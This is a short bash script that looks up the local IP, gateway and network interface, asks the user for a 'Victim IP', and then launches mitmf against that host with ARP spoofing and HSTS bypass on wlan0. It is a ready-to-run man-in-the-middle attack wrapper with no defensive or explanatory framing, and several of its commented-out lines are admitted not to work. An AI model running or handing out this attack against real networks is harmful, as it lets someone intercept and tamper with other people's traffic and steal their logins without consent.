#!/bin/bash






  
















echo "Fetching IP and Gateways "

##########export a=$(route -n)########
#####echo "Your Gateway and IP is"
#######echo $a###########


export ip=$(hostname -I)
echo Your IP is : 	  $ip
export gway=$(route -n | grep 'UG[ \t]' | awk '{print $2}')
echo  Your Gateway IP is  $gway 

##@@@ These Commands are Not working Sorry aout that@@@@@@
###########  iname=$(ip -o link show | sed -rn '/^[0-9]+: en/{s/.: ([^:]*):.*/\1/p}')  #######
#########           echo $iname     #########
export inf=$(ip r show|grep " src "|cut -d " " -f 3,12)
echo Your active Interface is : $inf
read -p "Please Enter the Victim IP : " victimIp

echo 	"Now sit Back and Relax "
mitmf -i wlan0 --target "$victimIp"  --gateway "$gway" --arp --spoof --hsts

